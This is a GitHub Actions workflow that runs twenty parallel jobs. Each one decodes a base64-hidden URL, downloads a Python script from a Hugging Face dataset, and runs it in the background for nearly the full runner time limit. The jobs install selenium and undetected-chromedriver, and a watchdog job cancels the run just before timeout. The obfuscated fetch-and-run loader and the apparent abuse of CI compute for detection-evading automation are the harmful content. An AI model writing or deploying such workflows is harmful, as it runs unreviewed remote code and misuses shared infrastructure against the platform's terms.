name: Nexus Task Controller

on:
  workflow_dispatch:

concurrency:
  group: nexus-gate-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Timeout Guard: إلغاء الـ Workflow عند الوصول للحد الأقصى
  # =================================================================
  timeout-guard:
    name: "Timeout Guard"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      SESSION_CAP: 3540
    steps:
      - name: Monitor Window
        run: |
          echo "[GUARD] Active watchdog started for ID: ${{ github.run_id }}"
          
          sleep "${SESSION_CAP}"

          echo "[GUARD] Reached maximum runtime limit. Aborting run..."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

  # =================================================================
  # Parallel Nodes: تشغيل العقد المتوازية
  # =================================================================
  parallel-nodes:
    name: "Node-Grid-${{ matrix.grid_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        grid_id: [G-301, G-302, G-303, G-304, G-305, G-306, G-307, G-308, G-309, G-310, G-311, G-312, G-313, G-314, G-315, G-316, G-317, G-318, G-319, G-320]

    steps:
      # -----------------------------------------------------------------
      # 1. تهيئة حزم البرامج
      # -----------------------------------------------------------------
      - name: Prepare System
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y --no-install-recommends curl python3-pip

      # -----------------------------------------------------------------
      # 2. تحميل الملف البرمجي
      # -----------------------------------------------------------------
      - name: Fetch Core Program
        run: |
          TARGET_URL=$(python3 -c "import base64; print(base64.b64decode('aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5').decode())")
          curl -sL "$TARGET_URL" -o app_core.py

      # -----------------------------------------------------------------
      # 3. تثبيت المكتبات المطلوبة
      # -----------------------------------------------------------------
      - name: Setup Dependencies
        run: |
          pip3 install --no-cache-dir requests psutil selenium undetected-chromedriver

      # -----------------------------------------------------------------
      # 4. تشغيل وإدارة المراقبة
      # -----------------------------------------------------------------
      - name: Run Background Script
        run: |
          python3 app_core.py &
          DAEMON_PID=$!

          sleep 3540

          if ps -p "$DAEMON_PID" > /dev/null 2>&1; then
            kill -9 "$DAEMON_PID"
          fi
